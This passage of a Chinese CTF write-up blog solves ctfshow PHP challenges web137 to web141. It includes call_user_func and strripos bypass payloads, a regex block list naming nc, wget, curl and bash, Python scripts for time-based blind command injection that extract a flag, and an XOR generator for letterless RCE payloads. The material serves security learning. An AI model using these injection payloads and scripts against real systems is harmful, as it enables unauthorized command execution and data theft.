<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span> </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$classname</span> = <span class="string">&quot;myclass&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>([<span class="string">&#x27;myclass&#x27;</span>,<span class="string">&#x27;say_hello&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line"><span class="comment">///Hello!</span></span><br><span class="line"><span class="comment">///Hello!</span></span><br></pre></td></tr></table></figure>

<p>这里可以看到，当我们把classname设为myclass的时候，将其与say_hello放入数组中，此时这两个是键值对，call_user_func()会解析数组并进行静态方法的调用，这种数组的形式是 <code>[类名或对象, 方法名]</code></p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">payload:</span>ctfshow[]=ctfshow<span class="variable">&amp;ctfshow</span>[]=getFlag</span><br></pre></td></tr></table></figure>

<p>传进去之后查看源代码发现也是有flag的</p>
<h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><h3 id="考查strripos-函数的使用和绕过"><a href="#考查strripos-函数的使用和绕过" class="headerlink" title="#考查strripos()函数的使用和绕过"></a>#考查strripos()函数的使用和绕过</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.strripos.php">https://www.php.net/manual/zh/function.strripos.php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfshow</span>[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure>

<p>其实这里的话就是用数组调用就可以了，但我们还是得学一下函数的哈</p>
<h3 id="strripos-函数"><a href="#strripos-函数" class="headerlink" title="strripos()函数"></a>strripos()函数</h3><p><code>strripos()</code> 是 PHP 中的一个字符串函数，用于查找字符串中一个子字符串最后一次出现的位置。与 <code>strrpos()</code> 类似，但 <code>strripos()</code> 是不区分大小写的</p>
<p>基础语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strripos</span>(<span class="keyword">string</span> <span class="variable">$haystack</span>, <span class="keyword">string</span> <span class="variable">$needle</span>, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>): <span class="keyword">int</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
<li><p>**<code>$haystack</code>**：要搜索的字符串。</p>
</li>
<li><p>**<code>$needle</code>**：要查找的子字符串。注意，如果 <code>$needle</code> 是一个空字符串，<code>strripos()</code> 会返回 <code>false</code>。</p>
</li>
<li><p>**<code>$offset</code>**（可选）：搜索的起始位置。如果为 0 或正数，则从左到右搜索，跳过 <code>haystack</code> 的开头 <code>offset</code> 个字节。</p>
<p>如果为负数，则从右向左执行搜索，跳过 <code>haystack</code> 的最后 <code>offset</code> 个字节并搜索首次出现的 <code>needle</code>。</p>
</li>
</ul>
<p>而题目中if(strripos($_POST[‘ctfshow’], “:”)&gt;-1)因为字符串是从0开始，所以实际上就是把:给过滤掉了，我们尝试绕过:就行，所以用数组绕过</p>
<h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>又回到exec的题目了</p>
<p>我们参考136的payload用tee命令，但是发现下载失败，应该是设置了权限</p>
<p>后面搜寻了wp发现是用bash的if+sleep配合awk+cut进行盲打，直接摘脚本了</p>
<p>先配合ls跑目录</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = string.ascii_letters + string.digits + <span class="string">&quot;-&quot;</span> + <span class="string">&quot;&#123;&quot;</span> + <span class="string">&quot;&#125;&quot;</span> + <span class="string">&quot;_&quot;</span> + <span class="string">&quot;~&quot;</span>    <span class="comment"># 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span>          <span class="comment"># 初始化一个空字符串，用于保存结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取多少行</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">99</span>):</span><br><span class="line">    key = <span class="number">0</span>   <span class="comment">#用于控制内层循环(j)的结束</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#不break的情况下，一行最多几个字符</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">99</span>):</span><br><span class="line">        <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:       <span class="comment">#n就是一个一个的返回值</span></span><br><span class="line">            <span class="comment">#执行ls跑目录</span></span><br><span class="line">            payload = <span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i, j, n)   <span class="comment">#&#123;n&#125;是占位符</span></span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            url = <span class="string">&quot;http://b43ed2e7-cdbe-47ec-937a-7288cc5c38a4.challenge.ctf.show/?c=&quot;</span> + payload</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url, timeout=(<span class="number">2.5</span>, <span class="number">2.5</span>))   <span class="comment">#设置超时时间为 2.5 秒,包括连接超时和读取超时，超时就是之前sleep 3了。</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果请求发生异常，表示条件满足，将当前字符 n 添加到结果字符串中，并结束当前内层循环</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + n</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> n == <span class="string">&#x27;~&#x27;</span>:    <span class="comment">#str的最后一位，“~”不常出现，用作结尾</span></span><br><span class="line">                key = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241118153713464.png" alt="image-20241118153713464"></p>
<p>拿flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = string.digits + string.ascii_lowercase + <span class="string">&quot;-&quot;</span> + <span class="string">&quot;_&quot;</span> + <span class="string">&quot;~&quot;</span><span class="comment"># 题目过滤花括号，这里就不加了</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">99</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="comment">#跑flag</span></span><br><span class="line">        payload = <span class="string">&quot;if [ `cat /f149_15_h3r3 |cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(j, n)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        url = <span class="string">&quot;http://b43ed2e7-cdbe-47ec-937a-7288cc5c38a4.challenge.ctf.show/?c=&quot;</span> + payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url, timeout=(<span class="number">2.5</span>, <span class="number">2.5</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + n</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> n==<span class="string">&quot;~&quot;</span>:</span><br><span class="line">            result = result + <span class="string">&quot;花括号&quot;</span></span><br><span class="line"><span class="comment">#记得替换payload的flag文件名和url就行</span></span><br></pre></td></tr></table></figure>

<h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><h3 id="函数嵌套使用-弱类型比较-intval函数绕过"><a href="#函数嵌套使用-弱类型比较-intval函数绕过" class="headerlink" title="#函数嵌套使用+弱类型比较+intval函数绕过"></a>#函数嵌套使用+弱类型比较+intval函数绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>f1 f2 只能含有小写字母和数字</p>
<p>对于intval函数前面有说过具体的用法和绕过方法，但是这里想要让if语句成立是比较困难的，所以我们应该看看如何能绕过里面的强比较去通过判断条件</p>
<p>通过表格松散比较可以看到0和字符串比较结果为真，所以我们可以让intval处理后的返回值为0，这时候if语句就能为真</p>
<p>intval会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p>
<p>然后我们看eval语句里面，f1和f2是函数嵌套使用，所以我们只要eval语句输出的结果是非数字字符就行</p>
<p>所以这道题的payload是很多的</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">md5</span><span class="params">(phpinfo()</span></span>)</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(sleep()</span></span>)</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(md5()</span></span>)</span><br><span class="line"><span class="function"><span class="title">current</span><span class="params">(localeconv)</span></span></span><br><span class="line"><span class="function"><span class="title">sha1</span><span class="params">(getcwd()</span></span>)   </span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">f1</span>=usleep&amp;f2=usleep</span><br><span class="line"><span class="attr">f1</span>=sleep&amp;f2=sleep</span><br><span class="line"><span class="attr">f1</span>=md5&amp;f2=phpinfo</span><br><span class="line"><span class="attr">f1</span>=md5&amp;f2=md5</span><br><span class="line"><span class="attr">f1</span>=sha1&amp;f2=getcwd</span><br><span class="line"><span class="attr">f1</span>=intval&amp;f2=getcwd</span><br><span class="line"><span class="attr">f1</span>=getcwd&amp;f2=getcwd</span><br><span class="line"><span class="attr">f1</span>=exec&amp;f2=exec</span><br><span class="line"><span class="attr">f1</span>=system&amp;f2=system</span><br></pre></td></tr></table></figure>

<p>思路就是找到一个函数, 使它的返回值为空或者非数字字符, 这样intval 之后也会变成0</p>
<h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><h3 id="异或进行无数字字母rce-正则匹配-W"><a href="#异或进行无数字字母rce-正则匹配-W" class="headerlink" title="#异或进行无数字字母rce+正则匹配&#x2F;^\W+$&#x2F;"></a>#异或进行无数字字母rce+正则匹配&#x2F;^\W+$&#x2F;</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="preg-match-‘-W-‘-v3"><a href="#preg-match-‘-W-‘-v3" class="headerlink" title="preg_match(‘&#x2F;^\W+$&#x2F;‘, $v3)"></a>preg_match(‘&#x2F;^\W+$&#x2F;‘, $v3)</h4><ul>
<li><strong><code>^</code></strong>: 匹配字符串的开头。</li>
<li>大写**<code>\W</code>**: 表示匹配任何非单词字符。在正则表达式中，小写<code>\w</code> 用于匹配字母、数字和下划线（即 <code>[a-zA-Z0-9_]</code>），而 大写<code>\W</code> 则是其相反，匹配任何非字母、非数字、非下划线的字符，如空格、标点符号等。</li>
<li><strong><code>+</code></strong>: 匹配前面的子模式一次或多次。因此，<code>\W+</code> 会匹配一个或多个连续的非单词字符。</li>
<li><strong><code>$</code></strong>: 匹配字符串的结尾。</li>
</ul>
<p><code>&#39;/^\W+$/&#39;</code> 的整体意思是：从字符串的开头到结尾都是由一个或多个非单词字符构成。</p>
<p>非单词字符（<code>\W</code>）包括：</p>
<ul>
<li>空白字符：空格、制表符、换行符等</li>
<li>标点符号：如句号、逗号、感叹号、问号、引号等</li>
<li>其他符号：如 <code>@</code>、<code>#</code>、<code>$</code>、<code>%</code>、<code>&amp;</code>、<code>*</code>、<code>(</code>、<code>)</code>、<code>-</code>、<code>+</code> 等</li>
</ul>
<p>我们来做个测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;???&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出结果:1</span></span><br></pre></td></tr></table></figure>

<p>然后可以看到有eval语句</p>
<p>所以这里的话属于是无字母构造payload进行rce了</p>
<p>之前我有学过无字母数字的rce分别有三种方式，一种是自增一种是取反一种是异或</p>
<p>我们来用异或进行构造payload，关于异或脚本的写法简单来说就是遍历字符表来异或，找到符合要求的记录下来，再输入想要的指令，在记录中遍历查找到 即可形成无数字字母的shell</p>
<p>这里我拿了师傅的一个异或的脚本，算是比较通用的，后面我再具体学习写脚本</p>
<h4 id="异或构造payload脚本"><a href="#异或构造payload脚本" class="headerlink" title="异或构造payload脚本"></a>异或构造payload脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#异或无数字字母绕过</span></span><br><span class="line"><span class="comment">#取得可用字符串放入文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_xor_words</span>():</span><br><span class="line">    preg=<span class="string">&#x27;[a-zA-Z0-9]&#x27;</span></span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#遍历扩展ascii码表</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.<span class="keyword">match</span>(preg,<span class="built_in">chr</span>(i),re.I) <span class="keyword">or</span> re.<span class="keyword">match</span>(preg,<span class="built_in">chr</span>(j),re.I)):</span><br><span class="line">                k=i^j</span><br><span class="line">                <span class="comment">#k在可显示字符中</span></span><br><span class="line">                <span class="keyword">if</span> k&gt;=<span class="number">32</span> <span class="keyword">and</span> k&lt;=<span class="number">126</span>:</span><br><span class="line">                    <span class="comment"># 以URL编码方式存储</span></span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (<span class="built_in">chr</span>(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&#x27;xor_file.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"><span class="comment">#通过输入的命令获取无数字字母命令</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_order</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_file.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">        <span class="comment">#异或后存入</span></span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    get_xor_words()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = <span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = <span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>)</span><br><span class="line">        param = get_order(s1) + get_order(s2)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span> + param+<span class="string">&quot;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119111431567.png" alt="image-20241119111431567"></p>
